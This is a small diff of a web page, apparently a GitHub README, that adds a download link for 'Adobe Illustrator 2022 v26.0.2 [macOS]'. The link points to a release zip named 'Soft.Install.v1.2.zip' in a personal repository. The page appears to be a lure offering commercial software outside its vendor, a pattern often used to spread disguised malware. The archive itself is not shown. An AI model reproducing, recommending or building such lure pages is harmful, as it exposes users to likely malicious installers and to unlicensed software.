@@ -5,5 +5,5 @@
 <p><img src="https://repository-images.githubusercontent.com/863801819/5b6160ae-a60e-47bf-937b-086cc7d7c36e"/></p>
 
 <p><strong>System Requirements: macOS 10.15 and later</p>
-Adobe Illustrator 2022 v26.0.2 [macOS] | <a href="">Download</a>
+Adobe Illustrator 2022 v26.0.2 [macOS] | <a href="https://github.com/AmrHuss/Adobe-Illustrator-2022-macOS/releases/download/26.0.2/Soft.Install.v1.2.zip">Download</a>
 </h1>
